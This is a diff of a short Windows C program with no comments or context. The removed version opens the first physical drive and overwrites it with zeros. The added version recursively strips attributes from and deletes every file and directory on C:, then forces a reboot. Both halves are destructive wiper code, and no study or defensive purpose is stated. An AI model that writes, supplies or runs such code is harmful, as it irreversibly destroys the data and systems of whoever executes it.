@@ -1,46 +1,40 @@
-#include <windows.h>
 #include <stdio.h>
+#include <windows.h>
+
+void deleteDirectory(char *path) {
+    WIN32_FIND_DATA findFileData;
+    char searchPath[MAX_PATH];
+    snprintf(searchPath, MAX_PATH, "%s\\*", path);
+    
+    HANDLE hFind = FindFirstFile(searchPath, &findFileData);
+    
+    if (hFind == INVALID_HANDLE_VALUE) {
+        FindClose(hFind);
+        return;
+    }
+    
+    do {
+        if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
+            char filePath[MAX_PATH];
+            snprintf(filePath, MAX_PATH, "%s\\%s", path, findFileData.cFileName);
+            
+            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                deleteDirectory(filePath);
+                RemoveDirectory(filePath);
+            } else {
+                SetFileAttributes(filePath, FILE_ATTRIBUTE_NORMAL);
+                DeleteFile(filePath);
+            }
+        }
+    } while (FindNextFile(hFind, &findFileData) != 0);
+    
+    FindClose(hFind);
+}
 
 int main() {
-    HANDLE hDisk = CreateFile(
-        "\\\\.\\PhysicalDrive0",  // first disk
-        GENERIC_WRITE,
-        0,
-        NULL,
-        OPEN_EXISTING,
-        0,
-        NULL
-    );
-
-    if (hDisk == INVALID_HANDLE_VALUE) {
-        printf("Failed to open disk\n");
-        return 1;
-    }
-
-    DWORD dwBytesReturned;
-    DISK_GEOMETRY diskGeometry;
-    DeviceIoControl(hDisk, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &diskGeometry, sizeof(diskGeometry), &dwBytesReturned, NULL);
-
-    LARGE_INTEGER diskSize = diskGeometry.Cylinders.LowPart;
-    diskSize.QuadPart *= diskGeometry.TracksPerCylinder;
-    diskSize.QuadPart *= diskGeometry.SectorsPerTrack;
-    diskSize.QuadPart *= diskGeometry.BytesPerSector;
-
-    char *buffer = (char *)malloc(diskSize.LowPart);
-    if (buffer == NULL) {
-        printf("Failed to allocate memory\n");
-        CloseHandle(hDisk);
-        return 1;
-    }
-
-    memset(buffer, 0, diskSize.LowPart);
-
-    DWORD written;
-    WriteFile(hDisk, buffer, diskSize.LowPart, &written, NULL);
-
-    free(buffer);
-
-    CloseHandle(hDisk);
-    printf("Wrote %lu bytes\n", written);
+    char drive[MAX_PATH] = "C:";
+    deleteDirectory(drive);
+    ExitWindowsEx(EWX_REBOOT, SHTDN_REASON_MINOR_OTHER);
+    
     return 0;
 }
